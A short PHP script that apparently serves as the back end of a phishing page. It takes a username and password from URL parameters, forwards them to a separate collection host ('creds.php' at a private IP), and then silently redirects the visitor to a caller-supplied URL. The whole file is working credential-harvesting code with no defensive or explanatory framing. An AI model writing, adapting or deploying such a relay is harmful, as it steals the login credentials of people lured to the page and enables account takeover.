<?php
if(isset($_GET['user']) and isset($_GET['pass'])) {
    $user = htmlspecialchars(strip_tags($_GET['user']));
    $pass = htmlspecialchars(strip_tags($_GET['pass']));
    $url = 'http://192.168.5.5:80/creds.php?user=' . $user . '&pass=' . $pass;
    file_get_contents($url);
}
if(isset($_GET['redir'])) {
    $redir = htmlspecialchars(strip_tags($_GET['redir']));
    if(filter_var($redir, FILTER_VALIDATE_URL)) {
        echo '<meta http-equiv="Refresh" content="0; url=' . $redir . '" />';
    }
}
?>
